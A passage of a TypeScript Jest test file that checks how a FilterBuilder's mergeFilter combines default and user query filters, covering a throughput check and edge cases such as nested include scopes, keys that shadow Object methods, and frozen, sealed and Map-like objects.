      const iterations = 1000;
      const startTime = Date.now();

      for (let i = 0; i < iterations; i++) {
        filterBuilder.mergeFilter({
          defaultFilter: { where: { isDeleted: false }, limit: 100 } as AnyFilter,
          userFilter: { where: { id: i }, limit: 10 } as AnyFilter,
        });
      }

      const elapsed = Date.now() - startTime;
      const opsPerSecond = (iterations / elapsed) * 1000;

      expect(opsPerSecond).toBeGreaterThan(1000); // At least 1000 ops/sec
    });
  });

  // ===========================================================================
  // Additional Edge Cases
  // ===========================================================================

  describe('Additional Edge Cases', () => {
    let filterBuilder: FilterBuilder;

    beforeEach(() => {
      filterBuilder = new FilterBuilder();
    });

    test('TC-145: should handle filter with only include', () => {
      const defaultFilter: AnyFilter = {
        include: [{ relation: 'posts' }, { relation: 'comments' }],
      };
      const userFilter: AnyFilter = {};

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.include).toEqual([{ relation: 'posts' }, { relation: 'comments' }]);
    });

    test('TC-146: should handle filter with nested include scopes', () => {
      const defaultFilter: AnyFilter = {
        include: [
          {
            relation: 'posts',
            scope: {
              where: { isPublished: true },
              include: [{ relation: 'author' }],
            },
          },
        ],
      };
      const userFilter: AnyFilter = {
        include: [
          {
            relation: 'posts',
            scope: {
              limit: 5,
            },
          },
        ],
      };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.include).toEqual([{ relation: 'posts', scope: { limit: 5 } }]);
    });

    test('TC-147: should handle multiple order fields', () => {
      const defaultFilter: AnyFilter = {
        order: ['priority DESC', 'createdAt DESC', 'id ASC'],
      };
      const userFilter: AnyFilter = {
        order: ['name ASC', 'updatedAt DESC'],
      };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.order).toEqual(['name ASC', 'updatedAt DESC']);
    });

    test('TC-148: should handle fields with all false values', () => {
      const defaultFilter: AnyFilter = {
        fields: { id: true, name: true, secret: false },
      };
      const userFilter: AnyFilter = {
        fields: { id: true, email: false, phone: false },
      };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.fields).toEqual({ id: true, email: false, phone: false });
    });

    test('TC-149: should handle extremely long field names', () => {
      const longFieldName = 'a'.repeat(1000);
      const defaultFilter: AnyFilter = { where: { normalField: 'value' } };
      const userFilter: AnyFilter = { where: { [longFieldName]: 'longValue' } };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.where?.normalField).toBe('value');
      expect(result.where?.[longFieldName]).toBe('longValue');
    });

    test('TC-150: should handle special JavaScript object keys', () => {
      const defaultFilter: AnyFilter = { where: { isDeleted: false } };
      const userFilter: AnyFilter = {
        where: {
          hasOwnProperty: 'test',
          toString: 'string',
          valueOf: 'value',
        },
      };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      // These shadow built-in Object methods, so we access them via indexer
      expect((result.where as any)?.hasOwnProperty).toBe('test');
      expect((result.where as any)?.toString).toBe('string');
      expect((result.where as any)?.valueOf).toBe('value');
    });

    test('TC-151: should handle numeric string keys', () => {
      const defaultFilter: AnyFilter = { where: { '0': 'zero', '1': 'one' } };
      const userFilter: AnyFilter = { where: { '2': 'two', '3': 'three' } };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.where?.['0']).toBe('zero');
      expect(result.where?.['1']).toBe('one');
      expect(result.where?.['2']).toBe('two');
      expect(result.where?.['3']).toBe('three');
    });

    test('TC-152: should handle object with getters and setters', () => {
      const objWithAccessors = {
        _value: 'test',
        get value() {
          return this._value;
        },
        set value(v) {
          this._value = v;
        },
      };

      const defaultFilter: AnyFilter = { where: { isDeleted: false } };
      const userFilter: AnyFilter = { where: { accessor: objWithAccessors } };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.where?.accessor).toBeDefined();
    });

    test('TC-153: should handle frozen objects', () => {
      const frozenObj = Object.freeze({ frozen: true, value: 'immutable' });
      const defaultFilter: AnyFilter = { where: { isDeleted: false } };
      const userFilter: AnyFilter = { where: { config: frozenObj } };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.where?.config).toEqual({ frozen: true, value: 'immutable' });
    });

    test('TC-154: should handle sealed objects', () => {
      const sealedObj = Object.seal({ sealed: true, value: 'sealed' });
      const defaultFilter: AnyFilter = { where: { isActive: true } };
      const userFilter: AnyFilter = { where: { data: sealedObj } };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.where?.data).toEqual({ sealed: true, value: 'sealed' });
    });

    test('TC-155: should handle Map-like objects', () => {
      const mapLike = {
        entries: [
          ['key1', 'value1'],
          ['key2', 'value2'],
        ],
        size: 2,
      };
      const defaultFilter: AnyFilter = { where: { isDeleted: false } };
      const userFilter: AnyFilter = { where: { mapping: mapLike } };

      const result = filterBuilder.mergeFilter({ defaultFilter, userFilter });

      expect(result.where?.mapping).toEqual(mapLike);
    });
  });
});
